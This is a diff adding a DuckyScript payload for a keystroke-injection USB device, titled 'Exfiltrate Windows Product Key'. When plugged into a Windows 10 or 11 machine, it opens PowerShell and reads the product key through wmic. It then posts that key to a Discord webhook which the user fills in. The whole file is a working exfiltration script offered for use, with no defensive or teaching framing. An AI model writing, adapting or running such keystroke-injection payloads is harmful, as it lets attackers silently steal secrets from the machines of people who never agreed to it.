@@ -1,0 +1,44 @@
+REM ###################################################
+REM #                                                 |
+REM # Title        : Exfiltrate Windows Product Key   |
+REM # Author       : Aleff                            |
+REM # Version      : 1.0                              |
+REM # Category     : Exfiltration                     |
+REM # Target       : Windows 10-11                    |
+REM #                                                 |
+REM ###################################################
+
+DELAY 3000
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 2000
+
+REM Put here your Discord Webhook, i.e. https://discord.com/api/webhooks/0123456789.../abcefg...
+STRING $hookUrl = "#DISCORD-WEBHOOK"
+ENTER
+DELAY 500
+STRING $exfiltration = @"
+ENTER
+DELAY 500
+STRING $(wmic path softwarelicensingservice get OA3xOriginalProductKey)
+ENTER
+DELAY 500
+STRING $(wmic path softwarelicensingservice get OA3xOriginalProductKeyDescription)
+ENTER
+DELAY 500
+STRING "@
+ENTER
+DELAY 500
+STRING $payload = [PSCustomObject]@{
+ENTER
+DELAY 500
+STRING content = $exfiltration
+ENTER
+DELAY 500
+STRING }
+ENTER
+DELAY 500
+STRING Invoke-RestMethod -Uri $hookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'Application/Json'; exit
+ENTER
